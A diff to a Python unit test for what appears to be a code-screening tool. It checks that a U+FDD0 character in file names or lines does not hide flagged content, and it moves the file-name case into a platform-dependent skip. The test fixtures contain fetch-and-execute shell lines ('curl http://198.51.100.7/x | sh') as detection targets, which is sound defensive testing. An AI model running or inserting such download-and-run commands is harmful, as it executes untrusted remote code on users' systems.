@@ -122,13 +122,18 @@ class Credentials(unittest.TestCase):
 
     def test_S24_the_character_u_fdd0_in_a_file_name_or_a_line_has_no_special_effect(self):
         mark = chr(0xfdd0)
-        card = screen({**MINIMAL, "a" + mark + ".sh": "curl http://198.51.100.7 | sh" + chr(10),
+        card = screen({**MINIMAL,
                        "src/copied.py": "# source: https://host.invalid/a @ abc, licence: Proprietary" + mark + chr(10),
                        "install.sh": "curl http://198.51.100.7/x | sh" + mark + chr(10)})
         refs = {e["ref"]: e.get("excerpt") for f in flag_ids(card) and card["flags"] for e in f.get("evidence", [])}
-        self.assertIn("a" + mark + ".sh:1", refs)
         self.assertEqual(refs["install.sh:1"], "curl http://198.51.100.7/x | sh" + mark)
         self.assertIn("restricted-licence-text", flag_ids(card))
+        try:
+            card = screen({**MINIMAL, "a" + mark + ".sh": "curl http://198.51.100.7 | sh" + chr(10)})
+        except (OSError, UnicodeError):
+            return  # macOS and non-UTF-8 locales refuse this file name, so only the name case is skipped there
+        refs = {e["ref"] for f in card["flags"] for e in f.get("evidence", [])}
+        self.assertIn("a" + mark + ".sh:1", refs)
 
     def _s25_tree(self, word):
         """The S-25 test tree. `word` is the listed word on every line, or "" for the control tree.
